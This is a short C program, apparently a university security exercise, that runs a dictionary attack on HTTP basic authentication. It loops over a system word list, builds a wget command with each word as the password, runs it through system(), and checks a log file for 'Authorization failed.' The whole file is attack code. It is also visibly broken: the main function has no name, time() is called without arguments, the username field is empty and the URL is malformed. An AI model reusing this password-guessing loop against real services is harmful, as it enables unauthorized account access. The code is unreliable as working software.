
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <strings.h>
# include <sys/time.h>

int ()
{

	char s[30];
	char c[100];
	char usr[50];
	char url[100];
	char charcopy[200];
	
	int starting,ending;							
	int totaltime;

	FILE* fp;
	FILE* f;
		
	int i,j,k;
			
	fp = fopen("/usr/share/lib/dict/words","r");					
	strcpy(charcopy, "wget --http-user= --http-passwd=");			
	strcpy(url, "-nv -o logfile1 http://sec-crack.cs.rmit.edu./SEC/2/");		
	
	starting=time();								

	
	while(!feof(fp))
	{
		j=40;
		fgets(c,30,fp);								
		
			
		for(i=0;i<strlen(c);i++)						
		{
			charcopy[j]=c[i];
			j++;
		}
		charcopy[j-1] = ' ';
		
		for(i=0;i<strlen(url);i++)						
		{
			charcopy[j]=url[i];						
			j++;
		}
		
		charcopy[j] = '\0';

		printf("%s\n",c);
		system(charcopy);
			
		f = fopen("logfile1","r");						
		
		if(f != (FILE*) NULL)
		{
		
			fgets(s,30,f);							
			if(strcmp(s,"Authorization failed.\n")!=0)			
			{
				ending=time();
				totaltime=ending-starting;				
				totaltime=totaltime/1000000000;
				totaltime=totaltime/60;
	
				printf("Time taken  break the password is %lld\n",totaltime);       
				exit(0);
			}
		}
			
		fclose(f);
	} 
	
	fclose(fp);
	
	
	return 1;
}
